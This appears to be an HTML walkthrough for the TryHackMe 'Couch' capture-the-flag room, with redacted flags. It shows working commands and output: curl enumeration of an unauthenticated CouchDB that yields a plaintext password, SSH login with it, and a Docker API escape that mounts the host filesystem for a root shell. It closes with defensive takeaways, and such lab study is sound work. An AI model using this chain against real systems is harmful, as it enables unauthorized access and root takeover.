@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Couch CTF — Full Walkthrough | TryHackMe</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    background:#0D1117;
+    color:#c9d1d9;
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,sans-serif;
+    padding:40px 20px;
+    line-height:1.7;
+  }
+  .container{max-width:960px;margin:0 auto}
+  .header{
+    background:linear-gradient(135deg,#161b22 0%,#1a2332 100%);
+    border:1px solid #30363d;
+    border-radius:12px;
+    padding:32px;
+    margin-bottom:28px;
+    text-align:center;
+    position:relative;
+    overflow:hidden;
+  }
+  .header::before{
+    content:'';position:absolute;top:0;left:0;right:0;height:4px;
+    background:linear-gradient(90deg,#00FF41,#00AAFF,#7B00FF);
+  }
+  .header h1{
+    font-family:'JetBrains Mono','Fira Code',monospace;
+    font-size:32px;
+    background:linear-gradient(135deg,#00FF41,#00AAFF);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+    background-clip:text;
+    margin-bottom:6px;
+  }
+  .header .subtitle{color:#8b949e;font-size:14px;font-family:'JetBrains Mono',monospace;}
+  .header .room-badge{
+    display:inline-block;margin-top:12px;padding:4px 14px;border-radius:20px;
+    background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);
+    color:#00FF41;font-family:'JetBrains Mono',monospace;font-size:12px;
+  }
+  .target-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px;margin-bottom:28px;}
+  .target-card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:16px;}
+  .target-card .label{font-size:11px;color:#8b949e;text-transform:uppercase;letter-spacing:1px;font-weight:600;margin-bottom:4px;}
+  .target-card .value{font-family:'JetBrains Mono',monospace;font-size:15px;color:#c9d1d9;}
+  .target-card .value.green{color:#00FF41}
+  .target-card .value.blue{color:#00AAFF}
+  .target-card .value.pink{color:#F472B6}
+  .section{
+    background:#161b22;border:1px solid #30363d;border-radius:8px;
+    padding:24px;margin-bottom:20px;
+  }
+  .section .phase-tag{
+    display:inline-block;padding:2px 10px;border-radius:12px;
+    font-size:11px;font-weight:600;font-family:'JetBrains Mono',monospace;margin-bottom:12px;
+  }
+  .phase-tag.recon{background:rgba(0,170,255,0.15);color:#00AAFF;border:1px solid rgba(0,170,255,0.3);}
+  .phase-tag.exploit{background:rgba(244,114,182,0.15);color:#F472B6;border:1px solid rgba(244,114,182,0.3);}
+  .phase-tag.privesc{background:rgba(255,165,0,0.15);color:#FFA500;border:1px solid rgba(255,165,0,0.3);}
+  .phase-tag.root{background:rgba(0,255,65,0.15);color:#00FF41;border:1px solid rgba(0,255,65,0.3);}
+  .section h2{
+    color:#00AAFF;font-size:18px;font-weight:600;margin-bottom:14px;
+    padding-bottom:8px;border-bottom:1px solid #30363d;font-family:'JetBrains Mono',monospace;
+  }
+  .section h3{color:#c9d1d9;font-size:15px;font-weight:600;margin:18px 0 8px;}
+  .section p{color:#8b949e;font-size:14px;margin-bottom:10px;}
+  .section p strong{color:#c9d1d9;}
+  .section ul,.section ol{margin:0 0 12px 20px;color:#8b949e;font-size:14px;}
+  .section li{margin-bottom:4px;}
+  .code-block{
+    background:#0D1117;border:1px solid #30363d;border-radius:6px;
+    padding:14px 16px;font-family:'JetBrains Mono','Fira Code',monospace;
+    font-size:13px;line-height:1.6;margin:10px 0;overflow-x:auto;color:#8b949e;
+  }
+  .code-block .prompt{color:#00FF41}
+  .code-block .cmd{color:#c9d1d9}
+  .code-block .output{color:#8b949e}
+  .flag-table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13px;}
+  .flag-table th{text-align:left;padding:8px 12px;border-bottom:2px solid #30363d;color:#8b949e;text-transform:uppercase;letter-spacing:1px;font-size:11px;font-family:'JetBrains Mono',monospace;}
+  .flag-table td{padding:8px 12px;border-bottom:1px solid #21262d;color:#c9d1d9;}
+  .flag-table tr:hover td{background:rgba(255,255,255,0.02)}
+  .flag-table .status-done{color:#00FF41}
+  .flag-table .step-num{color:#00AAFF;font-family:'JetBrains Mono',monospace}
+  .vuln-list{list-style:none;padding:0}
+  .vuln-list li{padding:6px 0 6px 20px;position:relative;font-size:14px;color:#8b949e;border-bottom:1px solid #21262d;}
+  .vuln-list li:last-child{border-bottom:none}
+  .vuln-list li::before{content:'›';position:absolute;left:0;color:#00AAFF;font-weight:700;font-size:16px;}
+  .summary-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:12px;margin-top:12px;}
+  .summary-card{background:#0D1117;border:1px solid #30363d;border-radius:6px;padding:14px 16px;text-align:center;}
+  .summary-card .num{font-family:'JetBrains Mono',monospace;font-size:28px;font-weight:700;}
+  .summary-card .num.green{color:#00FF41}
+  .summary-card .num.blue{color:#00AAFF}
+  .summary-card .num.pink{color:#F472B6}
+  .summary-card .desc{font-size:12px;color:#8b949e;margin-top:2px;}
+  .footer-note{text-align:center;margin-top:32px;padding:16px;border:1px solid #30363d;border-radius:8px;background:#161b22;}
+  .footer-note p{color:#8b949e;font-size:13px;}
+  .footer-note .highlight{color:#00FF41}
+  .blur-flag{
+    display:inline-block;background:rgba(255,255,255,0.04);border:1px dashed #555;
+    border-radius:4px;padding:2px 10px;font-family:'JetBrains Mono',monospace;
+    font-size:13px;color:#8b949e;user-select:none;
+  }
+  @media(max-width:600px){
+    body{padding:20px 12px}
+    .header h1{font-size:24px}
+    .section{padding:16px}
+    .flag-table{font-size:12px}
+    .flag-table th,.flag-table td{padding:6px 8px}
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <h1>🛋️ Couch — Full Walkthrough</h1>
+    <p class="subtitle">TryHackMe &bull; Capture The Flag &bull; 2 Flags</p>
+    <span class="room-badge">🏴‍☠️ ROOM COMPLETE — ALL 2 FLAGS CAPTURED</span>
+  </div>
+
+  <div class="target-grid">
+    <div class="target-card"><div class="label">Target IP</div><div class="value green">10.49.183.169</div></div>
+    <div class="target-card"><div class="label">Attack Machine</div><div class="value blue">komal</div></div>
+    <div class="target-card"><div class="label">Attack IP</div><div class="value pink">10.x.x.x</div></div>
+    <div class="target-card"><div class="label">Difficulty</div><div class="value">Easy</div></div>
+  </div>
+
+  <div class="section">
+    <h2>🏁 Flags Captured</h2>
+    <table class="flag-table">
+      <thead><tr><th>#</th><th>Flag</th><th>Method</th><th>Status</th></tr></thead>
+      <tbody>
+        <tr><td><span class="step-num">01</span></td><td><span class="blur-flag">FLAG{...}</span></td><td>CouchDB unauthenticated access → credential dump → SSH</td><td class="status-done">✅</td></tr>
+        <tr><td><span class="step-num">02</span></td><td><span class="blur-flag">FLAG{...}</span></td><td>Docker API privesc — mount host FS as root</td><td class="status-done">✅</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag recon">🔍 RECON</span>
+    <h2>🕵️ Reconnaissance</h2>
+    <p>Start with a full port scan to discover open services on the target.</p>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">nmap -sC -sV -p- 10.49.183.169 -oN nmap_scan.txt</span></div>
+      <div><span class="output">PORT     STATE SERVICE VERSION</span></div>
+      <div><span class="output">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10</span></div>
+      <div><span class="output">5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)</span></div>
+    </div>
+    <p>Two open ports discovered:</p>
+    <ul><li><strong>22/tcp</strong> — SSH (OpenSSH 7.2p2)</li><li><strong>5984/tcp</strong> — CouchDB 1.6.1 (no authentication required)</li></ul>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag exploit">💻 EXPLOIT</span>
+    <h2>🗄️ CouchDB Enumeration</h2>
+    <p>CouchDB exposes a REST API on port 5984. We interact directly via curl.</p>
+    <h3>List all databases</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl http://10.49.183.169:5984/_all_dbs</span></div>
+      <div><span class="output">["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]</span></div>
+    </div>
+    <p>The <strong>"secret"</strong> and <strong>"couch"</strong> databases look interesting.</p>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag exploit">💻 EXPLOIT</span>
+    <h2>🔑 Extracting Credentials</h2>
+    <h3>Check the "secret" database</h3>
+    <div class="code-block"><div><span class="prompt">└─$</span> <span class="cmd">curl http://10.49.183.169:5984/secret</span></div><div><span class="output">{"db_name":"secret","doc_count":1,...}</span></div></div>
+    <h3>Get the document list</h3>
+    <div class="code-block"><div><span class="prompt">└─$</span> <span class="cmd">curl http://10.49.183.169:5984/secret/_all_docs</span></div><div><span class="output">{"total_rows":1,"offset":0,"rows":[{"id":"a1320dd69fb4570d0a3d26df4e000be7",...}]}</span></div></div>
+    <h3>Fetch the document</h3>
+    <div class="code-block">
+      <div><span class="prompt">└─$</span> <span class="cmd">curl http://10.49.183.169:5984/secret/a1320dd69fb4570d0a3d26df4e000be7</span></div>
+      <div><span class="output">{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}</span></div>
+    </div>
+    <p>💡 Credentials: <strong>atena</strong>:<strong>t4qfzcc4qN##</strong></p>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag exploit">💻 EXPLOIT</span>
+    <h2>🚪 SSH Access</h2>
+    <p>Use the extracted credentials to SSH into the target.</p>
+    <div class="code-block"><div><span class="prompt">└─$</span> <span class="cmd">ssh atena@10.49.183.169</span></div><div><span class="output">atena@ubuntu:~$</span></div></div>
+    <h3>Capture the user flag</h3>
+    <div class="code-block">
+      <div><span class="prompt">atena@ubuntu:~$</span> <span class="cmd">ls && cat user.txt</span></div>
+      <div><span class="output">user.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>User Flag:</strong> <span class="blur-flag">FLAG{...}</span></p>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag privesc">⬆️ PRIVESC</span>
+    <h2>🐳 Privilege Escalation — Docker Escape</h2>
+    <h3>Check internal services</h3>
+    <div class="code-block">
+      <div><span class="prompt">atena@ubuntu:~$</span> <span class="cmd">netstat -tulpn</span></div>
+      <div><span class="output">Proto Recv-Q Send-Q Local Address    Foreign Address  State</span></div>
+      <div><span class="output">tcp   0      0      0.0.0.0:5984    0.0.0.0:*        LISTEN</span></div>
+      <div><span class="output">tcp   0      0      127.0.0.1:2375  0.0.0.0:*        LISTEN</span></div>
+      <div><span class="output">tcp   0      0      0.0.0.0:22      0.0.0.0:*        LISTEN</span></div>
+    </div>
+    <p>Docker API exposed on <code>127.0.0.1:2375</code> without TLS authentication.</p>
+    <h3>Escape to root</h3>
+    <p>Mount the host root filesystem and read the root flag:</p>
+    <div class="code-block">
+      <div><span class="prompt">atena@ubuntu:~$</span> <span class="cmd">docker -H 127.0.0.1:2375 run -v /:/mnt alpine chroot /mnt cat /root/root.txt</span></div>
+      <div><span class="output"><span class="blur-flag">FLAG{...}</span></span></div>
+    </div>
+    <p><strong>Root Flag:</strong> <span class="blur-flag">FLAG{...}</span></p>
+  </div>
+
+  <div class="section">
+    <span class="phase-tag root">🟢 ROOT</span>
+    <h2>🖥️ Interactive Root Shell (Bonus)</h2>
+    <p>Spawn a full interactive root shell:</p>
+    <div class="code-block">
+      <div><span class="prompt">atena@ubuntu:~$</span> <span class="cmd">docker -H 127.0.0.1:2375 run -it -v /:/hostos alpine chroot /hostos /bin/bash</span></div>
+      <div><span class="output">root@ubuntu:/# whoami</span></div>
+      <div><span class="output">root</span></div>
+    </div>
+    <p>💡 Docker daemon listened on <code>tcp://127.0.0.1:2375</code> without TLS. Mounting <code>/</code> into a container gives full host FS access as root.</p>
+  </div>
+
+  <div class="section">
+    <h2>🔬 Vulnerability Chain Summary</h2>
+    <ul class="vuln-list">
+      <li><strong>CouchDB No Auth</strong> — CouchDB exposed on port 5984 without authentication enabled</li>
+      <li><strong>Plaintext Credentials</strong> — Sensitive credentials stored in plaintext in a CouchDB document</li>
+      <li><strong>SSH Credential Reuse</strong> — Credentials found reused for SSH authentication</li>
+      <li><strong>Docker API Exposure</strong> — Docker daemon bound to TCP on 127.0.0.1:2375 without TLS</li>
+      <li><strong>Container Escape</strong> — Mount host root FS via unauthenticated Docker API</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h2>📊 Room Stats</h2>
+    <div class="summary-grid">
+      <div class="summary-card"><div class="num green">2</div><div class="desc">Flags Captured</div></div>
+      <div class="summary-card"><div class="num blue">4</div><div class="desc">Exploit Steps</div></div>
+      <div class="summary-card"><div class="num pink">1</div><div class="desc">Privilege Escalations<br>Docker Escape → Root</div></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <h2>🎯 Key Takeaways</h2>
+    <ul>
+      <li>CouchDB should never be exposed without authentication — set <code>require_valid_user = true</code></li>
+      <li>Docker daemon should never bind to TCP without TLS certificates</li>
+      <li>Defense in depth: a misconfigured Docker socket gives instant root on the host</li>
+    </ul>
+  </div>
+
+  <div class="footer-note">
+    <p>🏴‍☠️ Room: <strong>Couch</strong> — TryHackMe &nbsp;|&nbsp; All 2 Flags Captured &nbsp;|&nbsp; <span class="highlight">Root Shell Obtained</span></p>
+    <p style="margin-top:6px;font-size:12px;color:#555;">Flag values have been redacted from this writeup.</p>
+  </div>
+
+</div>
+</body>
+</html>
